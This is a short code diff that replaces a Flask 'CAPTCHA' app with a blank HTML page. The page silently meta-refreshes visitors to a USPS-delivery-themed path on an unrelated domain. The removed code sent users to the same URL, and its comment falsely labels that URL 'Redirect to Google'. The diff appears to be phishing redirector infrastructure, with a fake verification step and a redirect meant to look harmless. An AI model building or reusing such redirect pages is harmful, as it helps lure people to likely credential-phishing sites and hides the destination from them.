@@ -1,39 +1,12 @@
-from flask import Flask, render_template_string
-
-app = Flask(__name__)
-
-# Simple CAPTCHA page template
-CAPTCHA_PAGE = """
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>CAPTCHA Verification</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <meta http-equiv="refresh" content="5;url=https://africamuslsimsagency.com/delivery/usps_latest/uspshome/">
 </head>
 <body>
-    <h1>CAPTCHA Verification</h1>
-    <p>Please solve the CAPTCHA to proceed.</p>
-    <form method="POST" action="/verify-captcha">
-        <label for="captcha">What is 5 + 3?</label>
-        <input type="text" id="captcha" name="captcha" required>
-        <button type="submit">Submit</button>
-    </form>
+    <p>.......</p>
 </body>
 </html>
-"""
-
-@app.route('/')
-def captcha():
-    # Render the CAPTCHA page
-    return render_template_string(CAPTCHA_PAGE)
-
-@app.route('/verify-captcha', methods=['POST'])
-def verify_captcha():
-    # Check the CAPTCHA answer
-    answer = request.form.get('captcha')
-    if answer == "8":  # Correct answer to the CAPTCHA
-        return redirect("https://africamuslsimsagency.com/delivery/usps_latest/uspshome/")  # Redirect to Google
-    else:
-        return "CAPTCHA failed. Please try again.", 400
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
